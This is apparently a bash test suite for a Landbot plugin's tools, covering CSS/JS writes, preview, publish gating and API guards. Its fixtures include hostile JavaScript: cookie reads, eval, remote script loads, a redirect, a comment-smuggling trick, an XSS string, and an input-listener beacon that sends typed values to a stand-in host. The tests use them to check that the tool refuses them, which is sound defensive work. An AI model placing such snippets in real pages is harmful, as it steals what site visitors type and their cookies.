{ [ "$rc:$((np1-np0))" = "0:0" ] && pvcfg "$T/pv.html" | jq -e '.style == "a{color:red}</script><script>alert(1)</script>" and .welcome[0].title == "published greeting" and .channelToken == "H-777-PUB" and .firestore.api_key == "public" and (has("customerToken") or has("landbotToken") | not)' >/dev/null \
  && [ "$(grep -o '</script>' "$T/pv.html" | wc -l | tr -d ' ')" = 2 ] && grep -F 'new Landbot.Native(LB_PREVIEW_CONFIG)' "$T/pv.html" >/dev/null; } \
  && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL preview of our draft ($rc:$((np1-np0)))"; }
rs; MOCK_CFG="file://$T/pubcfg.json" "$C" preview --bot OTHER --out "$T/pv2.html" >/dev/null 2>&1; rc=$?
{ [ "$rc" = 0 ] && pvcfg "$T/pv2.html" | jq -e '.style == "live{}"' >/dev/null; } && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL preview with nothing pending does not show the published look (rc=$rc)"; }
rs; MOCK_MERGED=false MOCK_CFG="file://$T/pubcfg.json" "$C" preview --bot OTHER --out "$T/pv3.html" >/dev/null 2>&1; rc=$?
[ "$rc:$(npat)" = "0:0" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL preview of someone else's draft is a read and must work (rc=$rc)"; }
t "preview without a config url"  1:0 "$C" preview --bot OTHER --out "$T/pv4.html"
t "--out on another command"     64:0 "$C" css "$T/s.css" --bot OTHER --out "$T/x.html"
for sk in "$HERE/plugins/landbot/skills/"*/SKILL.md; do
  # the allowed-tools value: from its key to the next top-level key of the front matter (one line or several)
  at="$(awk 'NR == 1 && /^---$/ {f=1; next} f && /^---$/ {exit} f && /^allowed-tools:/ {a=1; print; next} a && /^[A-Za-z_-]+:/ {a=0} a {print}' "$sk")"
  ents="$(printf '%s\n' "$at" | grep -oE 'Bash\([^)]*\)' )"
  nch="$(printf '%s\n' "$ents" | grep -c 'scripts/channel')"; ngood="$(printf '%s\n' "$ents" | grep -cE 'scripts/channel" get \*\)$')"
  { [ -n "$ents" ] && [ "$nch" -ge 1 ] && [ "$nch" = "$ngood" ] && ! printf '%s\n' "$ents" | grep -qE '^Bash\(\*\)$|scripts/"?\*|/\*\)$'; } \
    && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL $(basename "$(dirname "$sk")"): allowed-tools pre-approves a channel write or a wildcard ($nch channel entries, $ngood read-only)"; }
done
t "channel not resolvable"     1:0 env MOCK_RESOLVED='?' "$C" v4 --bot BOT
t "v4"                         0:1 "$C" v4 --bot BOT
t "css"                        0:1 "$C" css "$T/s.css" --bot BOT
printf 'a{color:red}\n\n' > "$T/nl.css"
t "live css: the published config must carry it"        0:1 "$C" css "$T/s.css" --bot BOT
t "live css the published config drops (Sandbox): not live" 5:1 env MOCK_PUB_NOSTYLE=1 "$C" css "$T/s.css" --bot BOT
t "live css without a config url: not verified"          4:1 env MOCK_CFG= "$C" css "$T/s.css" --bot BOT
t "live v4 served"                                        0:1 "$C" v4 --bot BOT
t "css ending in newlines"     0:1 "$C" css "$T/nl.css" --bot BOT
t "v4 <id> --bot (0.3.1 form)" 0:1 "$C" v4 777 --bot BOT
t "css <id> <file> --bot (0.3.1 form)" 0:1 "$C" css 777 "$T/s.css" --bot BOT
t "--id matching"              0:1 "$C" v4 --id 777 --bot BOT
t "get --bot"                  0:0 "$C" get --bot BOT
t "get <id>"                   0:0 "$C" get 777
t "get unknown id"             1:0 "$C" get 555
t "css unreadable file"       66:0 "$C" css /nonexistent.css --bot BOT
# Custom JS: checked before anything is sent; backed up; "stored, not served" is exit 3
printf '/* lb-js: test 1 */\ndocument.body.classList.add("x");\n' > "$T/ok.js"
printf 'document.body.classList.add("x");\n' > "$T/nomark.js"
printf '/* lb-js: t */\nvar a = "#{x}";\n' > "$T/hash.js"
printf '/* lb-js: t */\nfetch("https://example.com/c", {method:"POST"});\n' > "$T/fetch.js"
printf '/* lb-js: t */\nvar c = document.cookie;\n' > "$T/cookie.js"
printf '/* lb-js: t */\nwindow.eval("1");\n' > "$T/eval.js"
printf '<script src="https://cdn.example.com/x.js"></script>\n/* lb-js: t */\n' > "$T/src.js"
{ printf '/* lb-js: big */\n'; head -c 61000 /dev/zero | tr '\0' 'a'; } > "$T/big.js"
t "custom js without a config url is not verified" 4:1 env MOCK_CFG= "$C" js "$T/ok.js" --bot BOT --custom
t "custom js without --custom refused" 65:0 "$C" js "$T/ok.js" --bot BOT
t "js without marker"         65:0 "$C" js "$T/nomark.js" --bot BOT --custom
t "js with #{"                65:0 "$C" js "$T/hash.js" --bot BOT --custom
t "js with fetch"             65:0 "$C" js "$T/fetch.js" --bot BOT --custom
t "js reading cookies"        65:0 "$C" js "$T/cookie.js" --bot BOT --custom
t "js with eval"              65:0 "$C" js "$T/eval.js" --bot BOT --custom
t "js loading a script"       65:0 "$C" js "$T/src.js" --bot BOT --custom
t "js over 60k"               65:0 "$C" js "$T/big.js" --bot BOT --custom
t "js without --bot"          64:0 "$C" js "$T/ok.js"
t "js --clear"                 0:1 "$C" js --clear --bot BOT
t "js --clear with a file"    64:0 "$C" js --clear "$T/ok.js" --bot BOT
t "--clear on css"            64:0 "$C" css --clear "$T/s.css" --bot BOT
printf '/* lb-js: t */\ndocument.addEventListener("input", function(e){ (new Image()).src = "https://x.example/c?v=" + e.target.value; });\n' > "$T/img.js"
printf '/* lb-js: t */\nvar c = document["cookie"];\n' > "$T/cookie2.js"
printf '/* lb-js: t */\nlocation.href = "https://x.example/";\n' > "$T/loc.js"
t "custom js: new Image beacon"  65:0 "$C" js "$T/img.js" --bot BOT --custom
t "custom js: document[cookie]"  65:0 "$C" js "$T/cookie2.js" --bot BOT --custom
t "custom js: navigation"        65:0 "$C" js "$T/loc.js" --bot BOT --custom
awk 'NR==1{print} /var CONFIG = \{/ && !d {print; printf "    //\342\200\250leak: (function(){ return 1; })(),\n"; d=1; next} NR>1{print}' "$TROOT/landbot-style/modules/steps.js" > "$T/steps-ls.js"
t "module with a U+2028 comment trick refused" 65:0 "$C" js "$T/steps-ls.js" --bot BOT
M="$TROOT/landbot-style/modules"
sed 's/total: 5, /total: 3, /' "$M/steps.js" > "$T/steps-cfg.js"
sed 's/total: 5, /total: (function(){ return 3; })(), /' "$M/steps.js" > "$T/steps-fn.js"
sed 's/var total = Math.max/var total = 1 + Math.max/' "$M/steps.js" > "$T/steps-code.js"
t "module with CONFIG changed is accepted" 4:1 env MOCK_CFG= "$C" js "$T/steps-cfg.js" --bot BOT
t "module unchanged is accepted"           4:1 env MOCK_CFG= "$C" js "$M/messaging.js" --bot BOT
t "module with code in CONFIG refused"    65:0 "$C" js "$T/steps-fn.js" --bot BOT
t "module with changed code refused"      65:0 "$C" js "$T/steps-code.js" --bot BOT
awk '{ if ($0 ~ /^[[:space:]]*\};[[:space:]]*$/ && !d) { print "  }; document.addEventListener(\"input\", function(e){ (new Image()).src = \"https://x.example/c?v=\" + e.target.value; });"; d=1 } else print }' "$M/steps.js" > "$T/steps-tail.js"
grep -q 'new Image' "$T/steps-tail.js" && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL could not build the CONFIG-tail fixture"; }
t "code after CONFIG's closing brace refused" 65:0 "$C" js "$T/steps-tail.js" --bot BOT
{ cat "$M/steps.js"; echo "/* a harmless comment */"; } > "$T/steps-comment.js"
t "edited module with --custom goes to the custom lint" 4:1 env MOCK_CFG= "$C" js "$T/steps-comment.js" --bot BOT --custom
t "edited module without --custom refused"              65:0 "$C" js "$T/steps-comment.js" --bot BOT
printf '{"foot":null,"version":"3.1.0"}' > "$T/cfg-nofoot.json"
t "js stored, not served"      3:1 env MOCK_CFG="file://$T/cfg-nofoot.json" "$C" js "$T/ok.js" --bot BOT --custom
printf '{"foot":"<script>x</script>","version":"3.1.0"}' > "$T/cfg-other.json"
t "js: config serves another script" 5:1 env MOCK_CFG="file://$T/cfg-other.json" "$C" js "$T/ok.js" --bot BOT --custom
{ printf '<script>\n'; cat "$T/ok.js"; printf '\n</script>\n'; } | jq -Rs '{foot: ., version: "3.1.0"}' > "$T/cfg-foot.json"
t "js served, same script"     0:1 env MOCK_CFG="file://$T/cfg-foot.json" "$C" js "$T/ok.js" --bot BOT --custom
rm -rf "$T/state"; "$C" css "$T/s.css" --bot BOT >/dev/null 2>&1
nb=$(ls "$T/state/backups" 2>/dev/null | wc -l | tr -d ' '); [ "$nb" -ge 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL css write left no backup"; }
"$C" css "$T/s.css" --bot BOT >/dev/null 2>&1; "$C" css "$T/s.css" --bot BOT >/dev/null 2>&1
nb2=$(ls "$T/state/backups" | wc -l | tr -d ' '); [ "$nb2" -ge 3 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL two writes in one second overwrote a backup ($nb2 files)"; }
grep -q 'OP^^' "$C" && { fail=$((fail+1)); echo "FAIL bash-4-only expansion in channel (macOS runs bash 3.2)"; } || pass=$((pass+1))

# draft-check: the gate before a publish, on drafts built by hand
DK="$T/draft-check"
mk() { jq -n "$1" > "$T/$2"; }
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},welcome:{id:"welcome",template:"var_text",name:"Greeting",params:{text:"Hi! Name?",richText:"<p>Hi! Name?</p>",destination:"name"}},bye:{id:"bye",template:"chat",params:{messages:[{text:"Thanks"}],buttons:[]}}},connections:{"welcome.$success--bye":{sourcePath:"welcome",targetPath:"bye",type:"$success"}}}}}' good.json
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}}},connections:{}}}}' empty.json
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},n0:{id:"n0",template:"chat",params:{messages:[{text:"x"}]}}},connections:{}}}}' nogreet.json
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},welcome:{id:"welcome",template:"var_text",params:{text:"Hi! Name?",richText:"<p>Ask anything</p>",destination:"name"}},bye:{id:"bye",template:"chat",params:{}}},connections:{"welcome.$success--bye":{sourcePath:"welcome",targetPath:"bye",type:"$success"}}}}}' askany.json
mk '{data:{save_state:"IS_PRESAVED",violations:[],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},welcome:{id:"welcome",template:"var_text",params:{text:"Hi",richText:"<p>Hi</p>",destination:"name"}}},connections:{"welcome.$success--gone":{sourcePath:"welcome",targetPath:"gone",type:"$success"}}}}}' dangling.json
mk '{data:{save_state:"IS_NOT_VALID",violations:[{code:"param_required",block_id:"welcome",param:"text"}],diagram:{nodes:{hidden:{id:"hidden",template:"hidden",params:{}},welcome:{id:"welcome",template:"var_text",params:{}}},connections:{}}}}' viol.json
g() { local name="$1" want="$2" file="$3"; MOCK_DRAFT="$T/$file" "$DK" gate BOTU >/dev/null 2>&1; local rc=$?
  [ "$rc" = "$want" ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL gate $name: rc=$rc, want $want"; }; }
rm -rf "$T/state"
g "no snapshot blocks"          65 good.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
g "clean draft passes"          0 good.json
rm -rf "$T/state"
g "empty draft blocked"        65 empty.json
g "no greeting blocked"        65 nogreet.json
g "Ask anything blocked"       65 askany.json
g "dangling connection blocked" 65 dangling.json
g "violations blocked"         65 viol.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
g "unchanged since save passes" 0 good.json
jq '.data.diagram.nodes.welcome.params.text = "Changed in the builder" | .data.diagram.nodes.welcome.params.richText = "<p>Changed in the builder</p>"' "$T/good.json" > "$T/edited.json"
g "changed since save blocked" 65 edited.json
jq '.data.diagram.nodes.bye.top = 999' "$T/good.json" > "$T/moved.json"
g "moved-only passes"           0 moved.json
jq '.data.diagram.nodes.bye2 = .data.diagram.nodes.bye | .data.diagram.connections["welcome.$success--bye"].targetPath = "bye2"' "$T/good.json" > "$T/g2.json"
MOCK_DRAFT="$T/g2.json" "$DK" save BOTU >/dev/null 2>&1
jq '.data.diagram.connections["welcome.$success--bye"].targetPath = "bye"' "$T/g2.json" > "$T/rewired.json"
g "rewired connection blocked" 65 rewired.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" diff BOTU --record >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" save BOTU --auto >/dev/null 2>&1
g "pending change blocks after an auto save" 65 edited.json
MOCK_DRAFT="$T/edited.json" "$DK" save BOTU >/dev/null 2>&1
g "manual save clears the pending change"     0 edited.json
# around a write: a change the write does not explain becomes pending; the write's own change does not
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" post BOTU "$(jq -c '{nodes: {welcome: {params: .data.diagram.nodes.welcome.params}}}' "$T/edited.json")" >/dev/null 2>&1
g "own change around a write is not pending"  0 edited.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
jq '.data.diagram.nodes.welcome.name = "Hello"' "$T/edited.json" > "$T/renamed-and-edited.json"
MOCK_DRAFT="$T/renamed-and-edited.json" "$DK" post BOTU '{"nodes":{"welcome":{"params":null,"name":"Hello"}}}' >/dev/null 2>&1
g "a rename does not absorb someone else's text edit" 65 renamed-and-edited.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/renamed-and-edited.json" "$DK" post BOTU '{"nodes":{"welcome":{"params":{},"name":"Hello"}}}' >/dev/null 2>&1
g "empty params do not absorb a text edit"  65 renamed-and-edited.json
# a PUT: the draft must now be the diagram sent
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
jq -c '{put: {nodes: (.data.diagram.nodes | with_entries(.value |= {params: (.params // {}), name: (.name // null)})), conns: [.data.diagram.connections | to_entries[] | .value + {id: .key, kind: "add"}]}}' "$T/good.json" > "$T/exp-put.json"
MOCK_DRAFT="$T/edited.json" "$DK" post BOTU "@$T/exp-put.json" >/dev/null 2>&1
g "a PUT does not absorb an edit made meanwhile" 65 edited.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" post BOTU "@$T/exp-put.json" >/dev/null 2>&1
g "a PUT that landed as sent is not pending"     0 good.json
# a connection delete does not authorise a new connection from the same output
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
jq '.data.diagram.nodes.d = {id:"d",template:"chat",params:{messages:[{text:"D"}],buttons:[]}} | del(.data.diagram.connections["welcome.$success--bye"]) | .data.diagram.connections["welcome.$success--d"] = {sourcePath:"welcome",targetPath:"d",type:"$success"}' "$T/good.json" > "$T/del-add.json"
MOCK_DRAFT="$T/del-add.json" "$DK" post BOTU '{"conns":[{"kind":"delete","sourcePath":"welcome","type":"$success"}]}' >/dev/null 2>&1
g "a delete does not authorise an addition"   65 del-add.json
# an id-matching addition does not hide a retarget of that connection
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
jq '.data.diagram.nodes.d = {id:"d",template:"chat",params:{messages:[{text:"D"}],buttons:[]}} | .data.diagram.connections["welcome.$success--bye"].targetPath = "d"' "$T/good.json" > "$T/retarget.json"
MOCK_DRAFT="$T/retarget.json" "$DK" post BOTU '{"nodes":{"d":{"params":{"messages":[{"text":"D"}],"buttons":[]},"added":true}},"conns":[{"kind":"add","id":"welcome.$success--bye","sourcePath":"welcome","targetPath":"bye","type":"$success"}]}' >/dev/null 2>&1
g "an id match does not hide a retarget"      65 retarget.json
# a PUT that sent a block with no settings does not adopt settings someone else wrote meanwhile
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
jq '.put.nodes.welcome.params = {}' "$T/exp-put.json" > "$T/exp-put-empty.json"
MOCK_DRAFT="$T/good.json" "$DK" post BOTU "@$T/exp-put-empty.json" >/dev/null 2>&1
g "a PUT does not adopt settings it did not send" 65 good.json
# an addition that reuses an existing connection id replaces a route: reported unless the write also deleted the old one
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/retarget.json" "$DK" post BOTU '{"nodes":{"d":{"params":{"messages":[{"text":"D"}],"buttons":[]},"added":true}},"conns":[{"kind":"add","id":"welcome.$success--bye","sourcePath":"welcome","targetPath":"d","type":"$success"}]}' >/dev/null 2>&1
g "a replaced route without a delete is reported" 65 retarget.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/retarget.json" "$DK" post BOTU '{"nodes":{"d":{"params":{"messages":[{"text":"D"}],"buttons":[]},"added":true}},"conns":[{"kind":"delete","sourcePath":"welcome","type":"$success"},{"kind":"add","id":"welcome.$success--bye","sourcePath":"welcome","targetPath":"d","type":"$success"}]}' >/dev/null 2>&1
g "an explicit replacement is not pending"       0 retarget.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" post BOTU "$(jq -c '{nodes: {bye: {params: .data.diagram.nodes.bye.params}}}' "$T/good.json")" >/dev/null 2>&1
g "someone else's change during a write is pending" 65 edited.json
rm -rf "$T/state"
MOCK_DRAFT="$T/good.json" "$DK" pre BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" post BOTU "$(jq -c '{nodes: {welcome: {params: .data.diagram.nodes.welcome.params}}}' "$T/good.json")" >/dev/null 2>&1
g "first write on this machine stays pending"  65 good.json
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
MOCK_DRAFT="$T/edited.json" "$DK" diff BOTU >/dev/null 2>&1; [ $? = 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL diff should report the edit"; }

# a draft over 1 MB (more than a command line holds) must still compare as unchanged, not as a failure
jq '.data.diagram.nodes += ([range(0; 1200)] | map({key: "n\(.)", value: {id: "n\(.)", template: "chat", params: {messages: [{text: ("x" * 900)}]}}}) | from_entries)' "$T/good.json" > "$T/big.json"
[ "$(wc -c < "$T/big.json" | tr -d ' ')" -gt 1048576 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL big fixture is not over 1 MB"; }
MOCK_DRAFT="$T/big.json" "$DK" save BIGU >/dev/null 2>&1
MOCK_DRAFT="$T/big.json" "$DK" diff BIGU >/dev/null 2>&1; [ $? = 0 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a draft over 1 MB does not compare as unchanged"; }

L="$T/lb.real"; export LANDBOT_API_TOKEN=dummy LANDBOT_API_URL=http://127.0.0.1:9
# publish goes through the gate: a blocked draft is refused before anything is sent (65), a clean one reaches the network (1)
rm -rf "$T/state"
t "publish of a blocked draft refused" 65:0 env MOCK_DRAFT="$T/askany.json" "$L" POST /bots/BOTU/versions
MOCK_DRAFT="$T/good.json" "$DK" save BOTU >/dev/null 2>&1
t "publish of a clean draft is sent"    1:0 env MOCK_DRAFT="$T/good.json" "$L" POST /bots/BOTU/versions
t "publish with a query string is gated" 65:0 env MOCK_DRAFT="$T/askany.json" "$L" POST "/bots/BOTU/versions?x=1"
chmod -x "$DK"; t "publish without the checker refused" 65:0 env MOCK_DRAFT="$T/good.json" "$L" POST /bots/BOTU/versions; chmod +x "$DK"
n50=$(printf 'x%.0s' $(seq 50)); n51=$(printf 'x%.0s' $(seq 51))
t "name 50 reaches the network" 1:0 "$L" POST /bots "{\"name\":\"$n50\"}"
t "name 51 refused locally"    65:0 "$L" POST /bots "{\"name\":\"$n51\"}"
printf '{"name":"%s"}' "$n51" > "$T/b.json"
t "name 51 in @file refused"   65:0 "$L" POST /bots "@$T/b.json"
t "50 accented chars pass"      1:0 "$L" POST /bots "{\"name\":\"$(printf 'é%.0s' $(seq 50))\"}"
t "rename not guarded"          1:0 "$L" PATCH /bots/x "{\"name\":\"$n51\"}"

# duplicate-create guard: a local server answers GET /bots with a bot of the same name created now
W="$T/www"; mkdir -p "$W"; now=$(date -u +%Y-%m-%dT%H:%M:%S)
printf '{"data":[{"id":"u-dup","name":"Dup test","created_at":"%s"}]}' "$now" > "$W/bots"
PORT=$(( 20000 + RANDOM % 20000 )); (cd "$W" && python3 -m http.server "$PORT" --bind 127.0.0.1 >/dev/null 2>&1) & SRV=$!
for _ in 1 2 3 4 5 6 7 8 9 10; do curl -s -o /dev/null "http://127.0.0.1:$PORT/bots" && break; sleep 0.3; done
export LANDBOT_API_URL="http://127.0.0.1:$PORT"
t "same name within 15 min refused" 65:0 "$L" POST /bots '{"name":"Dup test"}'
t "different name passes the guard" 1:0 "$L" POST /bots '{"name":"Other name"}'
kill "$SRV" 2>/dev/null; wait "$SRV" 2>/dev/null
# a redirect is a failure: the API never answers with one, so whatever did (a proxy, a login page)
# stood in front of it and nothing was read or written. --whoami asks the environment lb uses, and
# names an account only when the API does.
cat > "$T/front.py" <<'E'
import http.server, sys
class H(http.server.BaseHTTPRequestHandler):
    def go(self):
        if self.path.startswith("/v2/agents/me/"):
            auth = self.headers.get("Authorization")
            if auth == "Token good": b = b'{"agent":{"full_name":"Stub","email":"stub@example.invalid"}}'
            elif auth == "Token noname": b = b'{"agent":{"full_name":null,"email":"noname@example.invalid"}}'
            else: b = b'{"detail":"Invalid token."}'
            self.send_response(401 if b.startswith(b'{"detail"') else 200)
        else:
            b = b"<html>sign in</html>"; self.send_response(302); self.send_header("Location", "https://sso.example.invalid/login")
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    do_GET = do_POST = do_PUT = do_PATCH = do_DELETE = go
    def log_message(self, *a): pass
http.server.HTTPServer(("127.0.0.1", int(sys.argv[1])), H).serve_forever()
E
PORT=$(( 20000 + RANDOM % 20000 )); python3 "$T/front.py" "$PORT" & SRV=$!
for _ in 1 2 3 4 5 6 7 8 9 10; do curl -s -o /dev/null "http://127.0.0.1:$PORT/" && break; sleep 0.3; done
export LANDBOT_API_URL="http://127.0.0.1:$PORT/v0-alpha"
t "302 on a read is a failure"        1:0 "$L" GET /blocks
t "302 on a draft write is a failure" 1:0 "$L" POST /bots/BOTU/draft/blocks '{"blocks":[{"type":"send_text","params":{"text":"hi"}}]}'
"$L" GET /blocks 2>&1 >/dev/null | grep -q "redirected to sso.example.invalid" && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL a redirect does not say where it went"; }
cp "$SRC/setup-token" "$T/"
# https goes to a dead proxy: were --whoami to ask production again, it would fail here, not reach it
t "whoami asks the environment lb uses" 0:0 env LANDBOT_API_TOKEN=good https_proxy=http://127.0.0.1:9 HTTPS_PROXY=http://127.0.0.1:9 "$T/setup-token" --whoami
t "whoami with a refused token fails"   1:0 env LANDBOT_API_TOKEN=dummy https_proxy=http://127.0.0.1:9 HTTPS_PROXY=http://127.0.0.1:9 "$T/setup-token" --whoami
env LANDBOT_API_TOKEN=noname https_proxy=http://127.0.0.1:9 HTTPS_PROXY=http://127.0.0.1:9 "$T/setup-token" --whoami 2>/dev/null | grep -qx "Acting as noname@example.invalid" && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL whoami does not name an account that has no name by its email"; }
kill "$SRV" 2>/dev/null; wait "$SRV" 2>/dev/null
ua="$(grep -c 'landbot-plugin/' "$SRC/lb")"; [ "$ua" -ge 1 ] && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL user agent missing in lb"; }
# date-format guard: pickerFormat and format must agree, or nothing is sent (exit 65)
dfb='{"blocks":[{"type":"ask_date","params":{"text":"When?","destination":"d","pickerFormat":"dd/MM/yyyy","format":["%Y/%m/%d"]}}]}'
dfg='{"blocks":[{"type":"ask_date","params":{"text":"When?","destination":"d","pickerFormat":"dd/MM/yyyy","format":["%d/%m/%Y"]}}]}'
dfn='{"params":{"text":"When?","destination":"d","pickerFormat":"MM/dd/yyyy"}}'
dfd='{"diagram":{"nodes":{"v":{"params":{"pickerFormat":"yyyy/MM/dd","format":["%d/%m/%Y"]}}}}}'
t "date formats disagree"      65:0 "$L" POST /bots/x/draft/blocks "$dfb"
t "date formats agree"          1:0 "$L" POST /bots/x/draft/blocks "$dfg"
t "picker without format"      65:0 "$L" PATCH /bots/x/draft/blocks/v "$dfn"
t "date mismatch in PUT diagram" 65:0 "$L" PUT /bots/x/draft "$dfd"
printf '%s' "$dfb" > "$T/d.json"
t "date mismatch in @file"     65:0 "$L" POST /bots/x/draft/blocks "@$T/d.json"
t "GET with date body ignored"  1:0 "$L" GET /bots/x/draft/blocks "$dfb"
# display copy: a write whose richText disagrees with its text is refused; left out, or agreeing, it is sent
rtb='{"params":{"text":"Which email should we use?","richText":"<p>What is the best email to reach you?</p>","destination":"email"}}'
rtg='{"params":{"text":"What'"'"'s your *name*?","richText":"<p>What&#39;s your <strong>name</strong>?</p>"}}'
rtn='{"params":{"text":"Which email should we use?","destination":"email"}}'
rte='{"params":{"text":"Hi","errorText":"Try again","richErrorText":"<p>I am afraid I did not understand</p>"}}'
rth='{"params":{"text":"<iframe src=\"https://player.example/v\"></iframe>","richText":"<p> </p>"}}'
t "stale richText refused"      65:0 "$L" PATCH /bots/x/draft/blocks/q "$rtb"
t "matching richText sent"       1:0 "$L" PATCH /bots/x/draft/blocks/q "$rtg"
t "no richText sent"             1:0 "$L" PATCH /bots/x/draft/blocks/q "$rtn"
t "stale richErrorText refused" 65:0 "$L" PATCH /bots/x/draft/blocks/q "$rte"
t "HTML text not compared"       1:0 "$L" PATCH /bots/x/draft/blocks/q "$rth"
printf '%s' "$rtb" | jq '{diagram:{nodes:{q:.}}}' > "$T/rt.json"
t "stale richText in PUT diagram" 65:0 "$L" PUT /bots/x/draft "@$T/rt.json"
t "richText differing only in punctuation refused" 65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Pay $1.00","richText":"<p>Pay $100</p>"}}'
t "Chinese richText differing refused"             65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"你好，请问您的名字？","richText":"<p>你好，请问您的邮箱？</p>"}}'
t "Chinese richText matching sent"                  1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"你好，请问您的名字？","richText":"<p>你好，请问您的名字？</p>"}}'
t "multi-line richText matching sent"               1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Line one\nLine two","richText":"<p>Line one</p><p>Line two</p>"}}'
t "numeric entity hiding a change refused"         65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Pay $1.00","richText":"<p>Pay &#36;100</p>"}}'
t "markdown link matching sent"                     1:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"See [our site](https://x.example)","richText":"<p>See <a href=\"https://x.example\">our site</a></p>"}}'
t "HTML wording with a different price refused"   65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"<b>Pay $1.00</b>","richText":"<p>Pay $100</p>"}}'
t "markdown-looking display copy refused"         65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Pay $100","richText":"<p>[Pay $100](plus $900)</p>"}}'
t "unknown entity refused"                         65:0 "$L" PATCH /bots/x/draft/blocks/q '{"params":{"text":"Hi","richText":"<p>Hi &hellip;</p>"}}'

# channel back: the whole design goes back with one key changed; never over pending changes; a design that moves meanwhile stops it
mkdir -p "$T/state/created"; date +%s > "$T/state/created/BOT"   # the draft-check tests above cleared the state
t "back on, live"                  0:1 "$C" back on --bot BOT
jq -e '.design == {"background_color":"#ffffff","header_title":"Hi","back_button_visible":true} and (has("autosave") | not)' "$T/patches" >/dev/null && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL back on did not send the whole design with only back_button_visible added"; }
t "back off, bot not created here: draft" 0:1 "$C" back off --bot OTHER
jq -e '.autosave == true and .design.back_button_visible == false and .design.header_title == "Hi"' "$T/patches" >/dev/null && pass=$((pass+1)) || { fail=$((fail+1)); echo "FAIL back off on another bot was not a whole-design draft write"; }
t "back off: draft the builder previews must hold it" 1:1 env MOCK_NOTESTCFG=1 "$C" back off --bot OTHER
t "back over pending changes refused" 75:0 env MOCK_MERGED=false "$C" back on --bot BOT
t "back when the design moves meanwhile refused" 75:0 env MOCK_FLIP_DESIGN=1 "$C" back on --bot BOT
t "back with a bad value"          64:0 "$C" back maybe --bot BOT
t "back without --bot"             64:0 "$C" back on
printf '/* lb-js: esc 1 */\nvar a = "a\\u00b7b";\n' > "$T/esc.js"
